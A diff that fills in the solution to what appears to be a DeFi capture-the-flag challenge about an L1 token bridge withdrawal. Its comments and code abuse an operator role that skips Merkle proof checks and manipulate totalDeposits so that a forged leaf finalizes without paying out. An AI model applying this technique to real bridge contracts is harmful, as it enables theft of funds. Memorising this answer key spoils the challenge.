@@ -86,10 +86,64 @@ contract WithdrawalChallenge is Test {
     }
 
     /**
-     * CODE YOUR SOLUTION HERE
+     * =========================================================
+     * SOLUTION - test_withdrawal()
+     * =========================================================
+     * Attack: operator finalize-without-proof + neutralize the malicious leaf
+     * The player has OPERATOR_ROLE, so finalizeWithdrawal() skips Merkle proof
+     * verification and accepts ANY (nonce, l2Sender, target, timestamp, message).
+     * Leaf #2 in the set is a forged 999,000 DVT withdrawal that would drain the
+     * bridge. The gateway marks a leaf finalized regardless of whether its inner
+     * call succeeds, so we make leaf #2's transfer FAIL while still finalizing it:
+     * 1. Warp past the 7-day delay (cheatcode, not a tx).
+     * 2. Finalize a crafted withdrawal that calls executeTokenWithdrawal with the
+     *    bridge itself as receiver for 1,100 DVT: token balance is unchanged
+     *    (self-transfer) but totalDeposits drops to 998,900.
+     * 3. Finalize the four real leaves with their original params. Leaf #2's inner
+     *    executeTokenWithdrawal underflows (998,900 - 999,000) and reverts inside
+     *    the forwarder, so failedMessages is set but the gateway still finalizes
+     *    the leaf and bumps counter - zero tokens drained.
+     * 4. Leaves #0/#1/#3 each move a legit 10 DVT (30 total, well under 1%).
+     *
+     * No player-nonce constraint here, so the calls are made inline.
+     * =========================================================
      */
     function test_withdrawal() public checkSolvedByPlayer {
-        
+        // Past the withdrawal delay window.
+        vm.warp(START_TIMESTAMP + 8 days);
+
+        // (2) Crafted reducer: lower totalDeposits below 999,000e18 without losing
+        // any token balance (receiver is the bridge itself).
+        bytes memory reducerInner =
+            abi.encodeWithSignature("executeTokenWithdrawal(address,uint256)", address(l1TokenBridge), uint256(1_100e18));
+        bytes memory reducerFwd = abi.encodeWithSignature(
+            "forwardMessage(uint256,address,address,bytes)",
+            uint256(1000), // arbitrary nonce (operator path doesn't check the tree)
+            address(l2Handler), // l2Sender must equal the configured handler for the forwarder auth
+            address(l1TokenBridge),
+            reducerInner
+        );
+        l1Gateway.finalizeWithdrawal(
+            1000, address(l2Handler), address(l1Forwarder), START_TIMESTAMP, reducerFwd, new bytes32[](0)
+        );
+
+        // (3+4) Finalize the four real leaves with their exact original params.
+        bytes[4] memory msgs;
+        uint256[4] memory tss;
+        msgs[0] = hex"01210a380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000";
+        tss[0] = 1718786915;
+        msgs[1] = hex"01210a3800000000000000000000000000000000000000000000000000000000000000010000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e510000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000";
+        tss[1] = 1718786965;
+        msgs[2] = hex"01210a380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e00000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e000000000000000000000000000000000000000000000d38be6051f27c260000000000000000000000000000000000000000000000000000000000000";
+        tss[2] = 1718787050;
+        msgs[3] = hex"01210a380000000000000000000000000000000000000000000000000000000000000003000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000";
+        tss[3] = 1718787127;
+
+        for (uint256 i = 0; i < 4; i++) {
+            l1Gateway.finalizeWithdrawal(
+                i, address(l2Handler), address(l1Forwarder), tss[i], msgs[i], new bytes32[](0)
+            );
+        }
     }
 
     /**
@@ -123,3 +177,4 @@ contract WithdrawalChallenge is Test {
         );
     }
 }
+
